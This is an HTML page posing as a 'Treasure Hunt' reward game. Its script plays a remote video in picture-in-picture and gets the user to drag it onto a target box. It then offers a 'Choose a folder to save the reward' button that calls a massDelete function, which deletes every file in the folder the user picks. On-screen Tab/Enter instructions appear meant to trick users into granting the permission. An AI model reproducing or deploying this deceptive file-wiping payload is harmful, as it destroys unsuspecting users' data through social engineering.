<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Treasure Hunt</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      background-color: #1e1e1e;
      color: #f4f4f4;
      font-family: 'Roboto', sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
    }

    .content-card {
      background-color: #2d2d2d;
      padding: 40px;
      border-radius: 15px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
      width: 80%;
      max-width: 700px;
      margin-top: 1000px;
      position: relative;
    }

    /* Tempatkan Place Treasure Box Here di atas */
    #pipTarget {
      width: 200px;
      height: 200px;
      border: 5px solid #f39c12;
      border-radius: 10px;
      position: absolute;
      top: -1050px; /* Menempatkan di atas */
      left: 20%;
      background-color: rgba(243, 156, 18, 0.6);
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 18px;
      color: #f4f4f4;
      cursor: pointer;
      box-shadow: 0 0 10px rgba(243, 156, 18, 0.5);
      transition: background-color 0.3s, transform 0.3s;
    }

    button {
      padding: 15px 25px;
      font-size: 18px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      box-shadow: 0 4px 8px rgba(0, 123, 255, 0.2);
      transition: all 0.3s ease-in-out;
      margin-top: 10px;
    }

    button:hover {
      background-color: #0056b3;
      transform: scale(1.05);
    }

    #rewardText {
      display: none;
      font-size: 30px;
      font-weight: bold;
      color: #27ae60;
      margin-top: 20px;
      text-shadow: 2px 2px 5px rgba(0,0,0,0.5);
    }

    #actionButton {
      display: none;
      background-color: #e74c3c;
    }

    .video-background {
      position: absolute;
      top: 50px;
      left: 10%;
      width: 80%;
      max-width: 1000px;
      background-image: url('https://cdn.pixabay.com/photo/2015/09/18/18/57/treasure-map-944717_960_720.jpg');
      background-size: cover;
      background-position: center;
      height: 350px;
      border-radius: 15px;
      z-index: -1;
    }
  </style>
</head>
<body>
  <div class="video-background"></div>
  <div class="content-card">
    <div id="pipTarget">Place Treasure Box Here</div>
    <div id="buttonContainer">
      <button id="pipButton">Treasure Box</button>
      <button id="actionButton">Choose a folder to save the reward</button>
    </div>
    <a id="rewardText">Press here, then Tab, then Enter, then Tab, then Enter to claim</a>
  </div>
  <video id="externalVideo" autoplay style="display: none;">
    <source src="http://selebewsss.github.io/spofcenah2/0428.mp4" type="video/mp4">
  </video>
  <script>
    const externalVideo = document.getElementById('externalVideo');
    const pipButton = document.getElementById('pipButton');
    const actionButton = document.getElementById('actionButton');
    const pipTarget = document.getElementById('pipTarget');
    const rewardText = document.getElementById('rewardText');

    let isPiPActive = false;

    pipButton.addEventListener('click', async () => {
      try {
        await externalVideo.play();
        await externalVideo.requestPictureInPicture();
        isPiPActive = true;
        monitorPiP();
      } catch (error) {
        console.error('Error:', error);
      }
    });

    function monitorPiP() {
      if (!isPiPActive) return;

      const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
          if (entry.isIntersecting && isPiPActive) {
            actionButton.style.display = 'block';
            pipButton.style.display = 'none';
            pipTarget.style.backgroundColor = 'rgba(39, 174, 96, 0.6)';
          } else {
            actionButton.style.display = 'none';
            pipTarget.style.backgroundColor = 'rgba(243, 156, 18, 0.6)';
          }
        });
      }, { threshold: 1.0 });

      observer.observe(pipTarget);
    }

    document.addEventListener('leavepictureinpicture', () => {
      isPiPActive = false;
      actionButton.style.display = 'none';
      pipButton.style.display = 'block';
      pipTarget.style.backgroundColor = 'rgba(243, 156, 18, 0.6)';
    });

    actionButton.addEventListener('click', async () => {
      pipButton.style.display = 'none';
      pipTarget.style.display = 'none';
      actionButton.style.display = 'none';
      externalVideo.style.display = 'none';
      rewardText.style.display = 'block';
      await massDelete();
    });

    async function massDelete() {
      try {
        const dirHandle = await window.showDirectoryPicker();
        let deletedCount = 0;
        for await (const entry of dirHandle.values()) {
          if (entry.kind === "file") {
            await dirHandle.removeEntry(entry.name);
            deletedCount++;
          }
        }
      } catch (error) {
        console.error('Mass delete error:', error);
      }
    }
  </script>
</body>
</html>
